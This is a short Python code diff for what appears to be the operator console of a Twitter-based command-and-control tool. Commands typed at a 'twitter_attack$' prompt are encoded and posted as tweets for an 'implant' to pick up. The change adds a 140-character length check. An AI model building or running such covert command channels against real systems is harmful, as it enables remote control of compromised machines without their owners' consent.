@@ -45,7 +45,17 @@ def limit():
 					   
 if __name__ == "__main__":
 	while True:
-		var = raw_input("twitter_attack$ ")
+	 	flag = 0
+	 	while (flag == 0):
+			var = raw_input("twitter_attack$ ")
+			msg = encode(var)
+			if (len(msg) <= 140):
+				flag = 1
+			else:
+				print '\n'
+				print 'Error. Make sure the command you enter contains no more than 140 characters.'
+				print '\n'
+				
 		if var == "exit":
 			print "You have closed the attack shell. Maually delete tweets from Twitter pages."
 			break
@@ -53,7 +63,6 @@ if __name__ == "__main__":
 		elif var == "help":	
 			print "HELP"
 		else: 
-			msg = encode(var) 
 			api.update_status(msg)
 			#get and print implant response, might need timing feature
 			sleep(5)
